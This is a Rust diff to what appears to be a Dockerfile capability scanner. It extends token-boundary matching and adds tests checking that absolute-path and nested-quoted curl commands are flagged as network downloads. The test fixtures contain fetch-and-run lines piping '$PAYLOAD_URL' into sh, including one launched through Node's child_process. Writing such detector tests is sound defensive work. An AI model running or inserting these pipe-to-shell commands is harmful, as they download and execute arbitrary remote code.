@@ -233,7 +233,16 @@ fn token_with_boundary(lower_line: &str, token: &str) -> bool {
             || before.is_none()
             || matches!(
                 before,
-                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&')
+                Some(b' ')
+                    | Some(b'\t')
+                    | Some(b'|')
+                    | Some(b';')
+                    | Some(b'&')
+                    | Some(b'/')
+                    | Some(b'(')
+                    | Some(b'"')
+                    | Some(b'\'')
+                    | Some(b'`')
             );
         let after = lower_line.get(token_end..).unwrap_or("");
         let right_ok = after.is_empty()
@@ -449,6 +458,28 @@ mod tests {
         }
     }
 
+    /// # Contract
+    ///
+    /// Dockerfile download commands can be invoked through absolute paths
+    /// or nested quoted command strings, and still carry observed network
+    /// behavior.
+    #[test]
+    fn dockerfile_capabilities_detects_quoted_and_absolute_download_commands() {
+        for content in [
+            "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
+            "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+        ] {
+            let caps = dockerfile_capabilities(content);
+            assert!(
+                caps.iter().any(|fact| {
+                    fact.capability == ArtifactCapability::NetworkAccess
+                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+                }),
+                "{content:?} must flip observed NetworkAccess; got {caps:?}",
+            );
+        }
+    }
+
     /// Contract: Dockerfile `ADD <url> <dest>` downloads remote content at
     /// build time and must flip observed NetworkAccess.
     #[test]
@@ -597,6 +628,26 @@ mod tests {
                     .iter()
                     .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                 "token line `{token}` must produce a Downloads edge; got {links:?}",
+            );
+        }
+    }
+
+    /// # Contract
+    ///
+    /// Dockerfile download edges mirror observed network capability
+    /// detection for absolute-path and nested quoted downloader commands.
+    #[test]
+    fn dockerfile_relations_records_download_edge_for_quoted_and_absolute_commands() {
+        for content in [
+            "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
+            "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+        ] {
+            let links = dockerfile_relations(content);
+            assert!(
+                links
+                    .iter()
+                    .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
+                "{content:?} must produce a Downloads edge; got {links:?}",
             );
         }
     }
